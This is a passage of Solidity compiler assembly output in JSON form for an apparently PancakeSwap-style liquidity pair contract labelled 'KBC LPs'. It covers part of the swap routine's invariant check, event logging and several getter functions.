											"name": "DUP10"
										},
										{
											"begin": 13501,
											"end": 13510,
											"name": "DUP6"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 13501,
											"end": 13523,
											"name": "AND"
										},
										{
											"begin": 13501,
											"end": 13523,
											"name": "SUB"
										},
										{
											"begin": 13489,
											"end": 13497,
											"name": "DUP4"
										},
										{
											"begin": 13489,
											"end": 13524,
											"name": "SUB"
										},
										{
											"begin": 13441,
											"end": 13540,
											"name": "tag",
											"value": "161"
										},
										{
											"begin": 13441,
											"end": 13540,
											"name": "JUMPDEST"
										},
										{
											"begin": 13424,
											"end": 13540,
											"name": "SWAP1"
										},
										{
											"begin": 13424,
											"end": 13540,
											"name": "POP"
										},
										{
											"begin": 13550,
											"end": 13564,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 13590,
											"end": 13600,
											"name": "DUP10"
										},
										{
											"begin": 13578,
											"end": 13587,
											"name": "DUP6"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 13578,
											"end": 13600,
											"name": "AND"
										},
										{
											"begin": 13578,
											"end": 13600,
											"name": "SUB"
										},
										{
											"begin": 13567,
											"end": 13575,
											"name": "DUP4"
										},
										{
											"begin": 13567,
											"end": 13600,
											"name": "GT"
										},
										{
											"begin": 13567,
											"end": 13666,
											"name": "PUSH [tag]",
											"value": "162"
										},
										{
											"begin": 13567,
											"end": 13666,
											"name": "JUMPI"
										},
										{
											"begin": 13665,
											"end": 13666,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 13567,
											"end": 13666,
											"name": "PUSH [tag]",
											"value": "163"
										},
										{
											"begin": 13567,
											"end": 13666,
											"name": "JUMP"
										},
										{
											"begin": 13567,
											"end": 13666,
											"name": "tag",
											"value": "162"
										},
										{
											"begin": 13567,
											"end": 13666,
											"name": "JUMPDEST"
										},
										{
											"begin": 13639,
											"end": 13649,
											"name": "DUP10"
										},
										{
											"begin": 13627,
											"end": 13636,
											"name": "DUP6"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 13627,
											"end": 13649,
											"name": "AND"
										},
										{
											"begin": 13627,
											"end": 13649,
											"name": "SUB"
										},
										{
											"begin": 13615,
											"end": 13623,
											"name": "DUP4"
										},
										{
											"begin": 13615,
											"end": 13650,
											"name": "SUB"
										},
										{
											"begin": 13567,
											"end": 13666,
											"name": "tag",
											"value": "163"
										},
										{
											"begin": 13567,
											"end": 13666,
											"name": "JUMPDEST"
										},
										{
											"begin": 13550,
											"end": 13666,
											"name": "SWAP1"
										},
										{
											"begin": 13550,
											"end": 13666,
											"name": "POP"
										},
										{
											"begin": 13709,
											"end": 13710,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 13697,
											"end": 13706,
											"name": "DUP3"
										},
										{
											"begin": 13697,
											"end": 13710,
											"name": "GT"
										},
										{
											"begin": 13697,
											"end": 13727,
											"name": "DUP1"
										},
										{
											"begin": 13697,
											"end": 13727,
											"name": "PUSH [tag]",
											"value": "164"
										},
										{
											"begin": 13697,
											"end": 13727,
											"name": "JUMPI"
										},
										{
											"begin": 13697,
											"end": 13727,
											"name": "POP"
										},
										{
											"begin": 13726,
											"end": 13727,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 13714,
											"end": 13723,
											"name": "DUP2"
										},
										{
											"begin": 13714,
											"end": 13727,
											"name": "GT"
										},
										{
											"begin": 13697,
											"end": 13727,
											"name": "tag",
											"value": "164"
										},
										{
											"begin": 13697,
											"end": 13727,
											"name": "JUMPDEST"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "PUSH [tag]",
											"value": "165"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "JUMPI"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "DUP2"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "MSTORE"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "ADD"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "DUP1"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "DUP1"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "ADD"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "DUP3"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "DUP2"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "SUB"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "DUP3"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "MSTORE"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "PUSH",
											"value": "22"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "DUP2"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "MSTORE"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "ADD"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "DUP1"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "PUSH data",
											"value": "50B0A6DD250A09C1CD083AD4BF9F97424665D60E7BC0A208A1151C7D0051999C"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "PUSH",
											"value": "22"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "SWAP2"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "CODECOPY"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "ADD"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "SWAP2"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "POP"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "POP"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "MLOAD"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "DUP1"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "SWAP2"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "SUB"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "SWAP1"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "REVERT"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "tag",
											"value": "165"
										},
										{
											"begin": 13676,
											"end": 13787,
											"name": "JUMPDEST"
										},
										{
											"begin": 13887,
											"end": 13908,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 13929,
											"end": 13971,
											"name": "PUSH [tag]",
											"value": "166"
										},
										{
											"begin": 13953,
											"end": 13970,
											"name": "PUSH [tag]",
											"value": "167"
										},
										{
											"begin": 13953,
											"end": 13962,
											"name": "DUP5"
										},
										{
											"begin": 13967,
											"end": 13969,
											"name": "PUSH",
											"value": "19"
										},
										{
											"begin": 13953,
											"end": 13970,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 13953,
											"end": 13966,
											"name": "PUSH [tag]",
											"value": "168"
										},
										{
											"begin": 13953,
											"end": 13970,
											"name": "AND"
										},
										{
											"begin": 13953,
											"end": 13970,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 13953,
											"end": 13970,
											"name": "tag",
											"value": "167"
										},
										{
											"begin": 13953,
											"end": 13970,
											"name": "JUMPDEST"
										},
										{
											"begin": 13929,
											"end": 13948,
											"name": "PUSH [tag]",
											"value": "169"
										},
										{
											"begin": 13929,
											"end": 13937,
											"name": "DUP8"
										},
										{
											"begin": 13942,
											"end": 13947,
											"name": "PUSH",
											"value": "2710"
										},
										{
											"begin": 13929,
											"end": 13948,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 13929,
											"end": 13941,
											"name": "PUSH [tag]",
											"value": "168"
										},
										{
											"begin": 13929,
											"end": 13948,
											"name": "AND"
										},
										{
											"begin": 13929,
											"end": 13948,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 13929,
											"end": 13948,
											"name": "tag",
											"value": "169"
										},
										{
											"begin": 13929,
											"end": 13948,
											"name": "JUMPDEST"
										},
										{
											"begin": 13929,
											"end": 13952,
											"name": "SWAP1"
										},
										{
											"begin": 13929,
											"end": 13971,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 13929,
											"end": 13952,
											"name": "PUSH [tag]",
											"value": "170"
										},
										{
											"begin": 13929,
											"end": 13971,
											"name": "AND"
										},
										{
											"begin": 13929,
											"end": 13971,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 13929,
											"end": 13971,
											"name": "tag",
											"value": "166"
										},
										{
											"begin": 13929,
											"end": 13971,
											"name": "JUMPDEST"
										},
										{
											"begin": 13887,
											"end": 13985,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 13999,
											"end": 14020,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 14041,
											"end": 14083,
											"name": "PUSH [tag]",
											"value": "171"
										},
										{
											"begin": 14065,
											"end": 14082,
											"name": "PUSH [tag]",
											"value": "167"
										},
										{
											"begin": 14065,
											"end": 14074,
											"name": "DUP5"
										},
										{
											"begin": 14079,
											"end": 14081,
											"name": "PUSH",
											"value": "19"
										},
										{
											"begin": 14065,
											"end": 14082,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 14065,
											"end": 14078,
											"name": "PUSH [tag]",
											"value": "168"
										},
										{
											"begin": 14065,
											"end": 14082,
											"name": "AND"
										},
										{
											"begin": 14065,
											"end": 14082,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 14041,
											"end": 14083,
											"name": "tag",
											"value": "171"
										},
										{
											"begin": 14041,
											"end": 14083,
											"name": "JUMPDEST"
										},
										{
											"begin": 13999,
											"end": 14097,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 14198,
											"end": 14244,
											"name": "PUSH [tag]",
											"value": "174"
										},
										{
											"begin": 14233,
											"end": 14243,
											"name": "PUSH",
											"value": "5F5E100"
										},
										{
											"begin": 14198,
											"end": 14228,
											"name": "PUSH [tag]",
											"value": "175"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 14198,
											"end": 14213,
											"name": "DUP12"
										},
										{
											"begin": 14198,
											"end": 14213,
											"name": "DUP2"
										},
										{
											"begin": 14198,
											"end": 14213,
											"name": "AND"
										},
										{
											"begin": 14198,
											"end": 14213,
											"name": "SWAP1"
										},
										{
											"begin": 14198,
											"end": 14228,
											"name": "DUP12"
										},
										{
											"begin": 14198,
											"end": 14228,
											"name": "AND"
										},
										{
											"begin": 14198,
											"end": 14228,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 14198,
											"end": 14217,
											"name": "PUSH [tag]",
											"value": "168"
										},
										{
											"begin": 14198,
											"end": 14228,
											"name": "AND"
										},
										{
											"begin": 14198,
											"end": 14228,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 14198,
											"end": 14228,
											"name": "tag",
											"value": "175"
										},
										{
											"begin": 14198,
											"end": 14228,
											"name": "JUMPDEST"
										},
										{
											"begin": 14198,
											"end": 14232,
											"name": "SWAP1"
										},
										{
											"begin": 14198,
											"end": 14244,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 14198,
											"end": 14232,
											"name": "PUSH [tag]",
											"value": "168"
										},
										{
											"begin": 14198,
											"end": 14244,
											"name": "AND"
										},
										{
											"begin": 14198,
											"end": 14244,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 14198,
											"end": 14244,
											"name": "tag",
											"value": "174"
										},
										{
											"begin": 14198,
											"end": 14244,
											"name": "JUMPDEST"
										},
										{
											"begin": 14136,
											"end": 14174,
											"name": "PUSH [tag]",
											"value": "176"
										},
										{
											"begin": 14136,
											"end": 14152,
											"name": "DUP4"
										},
										{
											"begin": 14157,
											"end": 14173,
											"name": "DUP4"
										},
										{
											"begin": 14136,
											"end": 14174,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 14136,
											"end": 14156,
											"name": "PUSH [tag]",
											"value": "168"
										},
										{
											"begin": 14136,
											"end": 14174,
											"name": "AND"
										},
										{
											"begin": 14136,
											"end": 14174,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 14136,
											"end": 14174,
											"name": "tag",
											"value": "176"
										},
										{
											"begin": 14136,
											"end": 14174,
											"name": "JUMPDEST"
										},
										{
											"begin": 14136,
											"end": 14244,
											"name": "LT"
										},
										{
											"begin": 14136,
											"end": 14244,
											"name": "ISZERO"
										},
										{
											"begin": 14111,
											"end": 14288,
											"name": "PUSH [tag]",
											"value": "177"
										},
										{
											"begin": 14111,
											"end": 14288,
											"name": "JUMPI"
										},
										{
											"begin": 14111,
											"end": 14288,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 14111,
											"end": 14288,
											"name": "DUP1"
										},
										{
											"begin": 14111,
											"end": 14288,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 14111,
											"end": 14288,
											"name": "DUP2"
										},
										{
											"begin": 14111,
											"end": 14288,
											"name": "MSTORE"
										},
										{
											"begin": 14111,
											"end": 14288,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 14111,
											"end": 14288,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 14111,
											"end": 14288,
											"name": "DUP3"
										},
										{
											"begin": 14111,
											"end": 14288,
											"name": "ADD"
										},
										{
											"begin": 14111,
											"end": 14288,
											"name": "MSTORE"
										},
										{
											"begin": 14111,
											"end": 14288,
											"name": "PUSH",
											"value": "A"
										},
										{
											"begin": 14111,
											"end": 14288,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 14111,
											"end": 14288,
											"name": "DUP3"
										},
										{
											"begin": 14111,
											"end": 14288,
											"name": "ADD"
										},
										{
											"begin": 14111,
											"end": 14288,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "50616E63616B653A204B"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "B0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 14111,
											"end": 14288,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 14111,
											"end": 14288,
											"name": "DUP3"
										},
										{
											"begin": 14111,
											"end": 14288,
											"name": "ADD"
										},
										{
											"begin": 14111,
											"end": 14288,
											"name": "MSTORE"
										},
										{
											"begin": 14111,
											"end": 14288,
											"name": "SWAP1"
										},
										{
											"begin": 14111,
											"end": 14288,
											"name": "MLOAD"
										},
										{
											"begin": 14111,
											"end": 14288,
											"name": "SWAP1"
										},
										{
											"begin": 14111,
											"end": 14288,
											"name": "DUP2"
										},
										{
											"begin": 14111,
											"end": 14288,
											"name": "SWAP1"
										},
										{
											"begin": 14111,
											"end": 14288,
											"name": "SUB"
										},
										{
											"begin": 14111,
											"end": 14288,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 14111,
											"end": 14288,
											"name": "ADD"
										},
										{
											"begin": 14111,
											"end": 14288,
											"name": "SWAP1"
										},
										{
											"begin": 14111,
											"end": 14288,
											"name": "REVERT"
										},
										{
											"begin": 14111,
											"end": 14288,
											"name": "tag",
											"value": "177"
										},
										{
											"begin": 14111,
											"end": 14288,
											"name": "JUMPDEST"
										},
										{
											"begin": 1244,
											"end": 1245,
											"name": "POP"
										},
										{
											"begin": 1244,
											"end": 1245,
											"name": "POP"
										},
										{
											"begin": 14309,
											"end": 14358,
											"name": "PUSH [tag]",
											"value": "178"
										},
										{
											"begin": 14317,
											"end": 14325,
											"name": "DUP5"
										},
										{
											"begin": 14327,
											"end": 14335,
											"name": "DUP5"
										},
										{
											"begin": 14337,
											"end": 14346,
											"name": "DUP9"
										},
										{
											"begin": 14348,
											"end": 14357,
											"name": "DUP9"
										},
										{
											"begin": 14309,
											"end": 14316,
											"name": "PUSH [tag]",
											"value": "179"
										},
										{
											"begin": 14309,
											"end": 14358,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 14309,
											"end": 14358,
											"name": "tag",
											"value": "178"
										},
										{
											"begin": 14309,
											"end": 14358,
											"name": "JUMPDEST"
										},
										{
											"begin": 14373,
											"end": 14439,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 14373,
											"end": 14439,
											"name": "DUP1"
										},
										{
											"begin": 14373,
											"end": 14439,
											"name": "MLOAD"
										},
										{
											"begin": 14373,
											"end": 14439,
											"name": "DUP4"
										},
										{
											"begin": 14373,
											"end": 14439,
											"name": "DUP2"
										},
										{
											"begin": 14373,
											"end": 14439,
											"name": "MSTORE"
										},
										{
											"begin": 14373,
											"end": 14439,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 14373,
											"end": 14439,
											"name": "DUP2"
										},
										{
											"begin": 14373,
											"end": 14439,
											"name": "ADD"
										},
										{
											"begin": 14373,
											"end": 14439,
											"name": "DUP4"
										},
										{
											"begin": 14373,
											"end": 14439,
											"name": "SWAP1"
										},
										{
											"begin": 14373,
											"end": 14439,
											"name": "MSTORE"
										},
										{
											"begin": 14373,
											"end": 14439,
											"name": "DUP1"
										},
										{
											"begin": 14373,
											"end": 14439,
											"name": "DUP3"
										},
										{
											"begin": 14373,
											"end": 14439,
											"name": "ADD"
										},
										{
											"begin": 14373,
											"end": 14439,
											"name": "DUP14"
										},
										{
											"begin": 14373,
											"end": 14439,
											"name": "SWAP1"
										},
										{
											"begin": 14373,
											"end": 14439,
											"name": "MSTORE"
										},
										{
											"begin": 14373,
											"end": 14439,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 14373,
											"end": 14439,
											"name": "DUP2"
										},
										{
											"begin": 14373,
											"end": 14439,
											"name": "ADD"
										},
										{
											"begin": 14373,
											"end": 14439,
											"name": "DUP13"
										},
										{
											"begin": 14373,
											"end": 14439,
											"name": "SWAP1"
										},
										{
											"begin": 14373,
											"end": 14439,
											"name": "MSTORE"
										},
										{
											"begin": 14373,
											"end": 14439,
											"name": "SWAP1"
										},
										{
											"begin": 14373,
											"end": 14439,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 14373,
											"end": 14439,
											"name": "DUP12"
										},
										{
											"begin": 14373,
											"end": 14439,
											"name": "AND"
										},
										{
											"begin": 14373,
											"end": 14439,
											"name": "SWAP2"
										},
										{
											"begin": 14378,
											"end": 14388,
											"name": "CALLER"
										},
										{
											"begin": 14378,
											"end": 14388,
											"name": "SWAP2"
										},
										{
											"begin": 14373,
											"end": 14439,
											"name": "PUSH",
											"value": "D78AD95FA46C994B6551D0DA85FC275FE613CE37657FB8D5E3D130840159D822"
										},
										{
											"begin": 14373,
											"end": 14439,
											"name": "SWAP2"
										},
										{
											"begin": 14373,
											"end": 14439,
											"name": "DUP2"
										},
										{
											"begin": 14373,
											"end": 14439,
											"name": "SWAP1"
										},
										{
											"begin": 14373,
											"end": 14439,
											"name": "SUB"
										},
										{
											"begin": 14373,
											"end": 14439,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 14373,
											"end": 14439,
											"name": "ADD"
										},
										{
											"begin": 14373,
											"end": 14439,
											"name": "SWAP1"
										},
										{
											"begin": 14373,
											"end": 14439,
											"name": "LOG3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 1266,
											"end": 1267,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1255,
											"end": 1263,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1255,
											"end": 1267,
											"name": "SSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "tag",
											"value": "48"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "JUMPDEST"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MLOAD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "ADD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MSTORE"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "7"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP2"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MSTORE"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "ADD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "4B4243204C5073"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "C8"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP2"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MSTORE"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP2"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "tag",
											"value": "54"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "JUMPDEST"
										},
										{
											"begin": 1486,
											"end": 1494,
											"name": "PUSH",
											"value": "B"
										},
										{
											"begin": 1486,
											"end": 1494,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 1486,
											"end": 1494,
											"name": "DUP1"
										},
										{
											"begin": 1486,
											"end": 1494,
											"name": "DUP3"
										},
										{
											"begin": 1486,
											"end": 1494,
											"name": "AND"
										},
										{
											"begin": 1486,
											"end": 1494,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1516,
											"end": 1524,
											"name": "DUP4"
										},
										{
											"begin": 1516,
											"end": 1524,
											"name": "DIV"
										},
										{
											"begin": 1516,
											"end": 1524,
											"name": "SWAP1"
										},
										{
											"begin": 1516,
											"end": 1524,
											"name": "SWAP2"
										},
										{
											"begin": 1516,
											"end": 1524,
											"name": "AND"
										},
										{
											"begin": 1516,
											"end": 1524,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1556,
											"end": 1574,
											"name": "SWAP1"
										},
										{
											"begin": 1556,
											"end": 1574,
											"name": "DIV"
										},
										{
											"begin": 1556,
											"end": 1574,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 1556,
											"end": 1574,
											"name": "AND"
										},
										{
											"begin": 1556,
											"end": 1574,
											"name": "SWAP1"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "tag",
											"value": "57"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "JUMPDEST"
										},
										{
											"begin": 2877,
											"end": 2881,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2893,
											"end": 2929,
											"name": "PUSH [tag]",
											"value": "182"
										},
										{
											"begin": 2902,
											"end": 2912,
											"name": "CALLER"
										},
										{
											"begin": 2914,
											"end": 2921,
											"name": "DUP5"
										},
										{
											"begin": 2923,
											"end": 2928,
											"name": "DUP5"
										},
										{
											"begin": 2893,
											"end": 2901,
											"name": "PUSH [tag]",
											"value": "183"
										},
										{
											"begin": 2893,
											"end": 2929,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2893,
											"end": 2929,
											"name": "tag",
											"value": "182"
										},
										{
											"begin": 2893,
											"end": 2929,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 2946,
											"end": 2950,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "tag",
											"value": "181"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "JUMPDEST"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "SWAP3"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "SWAP2"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "POP"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "POP"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "tag",
											"value": "59"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "JUMPDEST"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "PUSH",
											"value": "8"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "AND"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "DUP2"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 2478,
											"end": 2752,
											"name": "tag",
											"value": "62"
										},
										{
											"begin": 2478,
											"end": 2752,
											"name": "JUMPDEST"
										},
										{
											"begin": 2617,
											"end": 2624,
											"name": "PUSH",
